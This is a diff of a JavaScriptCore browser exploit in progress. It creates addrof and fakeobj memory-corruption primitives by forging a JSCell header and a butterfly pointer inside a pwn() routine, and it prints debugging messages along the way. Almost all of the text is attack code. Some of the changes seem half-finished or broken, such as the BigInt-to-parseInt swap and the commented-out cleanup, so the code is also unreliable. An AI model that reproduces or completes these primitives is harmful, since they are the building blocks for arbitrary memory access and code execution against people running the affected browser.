@@ -109,44 +109,39 @@ var qwordAsFloat = qword => {
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[offset]);
+              return parseInt(float2bigint(a1[offset],true),16);
             }
             fakeobj = (addr) => {
-              a1[offset] = bigint2float(addr);
+              //port.postMessage
+              a1[offset] = addr;
               return b1[0];
             }
-
             let obj = {
               jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
-
             let addr = addrof(obj);
-            port.postMessage("obj @ " + addr.toString(16));
-
-            /*let fakeArr = fakeobj(addr + 0x10n);
-
-            // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            port.postMessage("obj @ " + addr.toString());
+            port.postMessage(typeof(addr) +"vs"+typeof(0x10))
+           
+            let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
+            port.postMessage("hey");
+            /*// subtract off the incref
+            doubleArrayCellHeader = float2bigint(fakeArr[0],true) - 0x1;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
-
             // fix broken cell header
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
-
             // grab a real butterfly pointer
             let doubleArrayButterfly = float2bigint(fakeArr[1]);
-
             // fix other broken cell header
             obj.fakeButterfly = b0;
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
-
             // fix the broken butterflys and setup cleaner addrof / fakeobj
             obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
             obj.fakeButterfly = a1;
             fakeArr[1] = bigint2float(doubleArrayButterfly);
             obj.fakeButterfly = b1;
             fakeArr[1] = bigint2float(doubleArrayButterfly);
-
             fakeobj = (addr) => {
               a1[0] = bigint2float(addr);
               return b1[0];
@@ -155,9 +150,9 @@ var qwordAsFloat = qword => {
               b1[0] = val;
               return float2bigint(a1[0]);
             }*/
-            port.postMessage("got stableish addrof/fakeobj");
+            port.postMessage("We got stableish addrof and fakeobj");
           }
-
+          
           function pwn() {
             try {
               setupPrimitives();
